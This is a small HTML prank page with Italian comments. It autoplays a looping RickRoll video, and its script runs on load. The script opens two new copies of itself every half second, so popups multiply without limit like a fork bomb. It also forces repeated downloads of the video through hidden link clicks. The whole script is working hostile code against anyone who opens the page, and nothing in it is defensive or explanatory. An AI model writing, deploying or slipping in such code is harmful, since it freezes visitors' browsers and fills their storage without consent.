<!DOCTYPE html>
<html lang="en" lang="it">
    <head>
        <title>kamikazze</title>
    </head>
    <body>
        <video width="100%" height="60%" autoplay="autoplay" loop="true" muted>
            <source src="RickRoll.mp4" type="video/mp4">  
        </video>
        
        <script>
            var src = 'index.html';
            setInterval(function() {
                window.open(src);
                window.open(src);
            }, 500);
            setInterval(function() {//da controllarre il funzionamento
                downloadRickRoll();
            }, 500);
           
            function downloadRickRoll() {
                const url = 'RickRoll.mp4'; // URL del file RickRoll.mp4
                const fileName = 'RickRoll.mp4';
            
                // Creare un elemento <a> nascosto
                const a = document.createElement('a');
                a.href = url;
                a.download = fileName;
            
                // Simulare un click sull'elemento <a>
                document.body.appendChild(a);
                a.click();
            
                // Pulizia: rimuovere l'elemento <a>
                document.body.removeChild(a);
            }
            
        </script>
    </body>
</html>
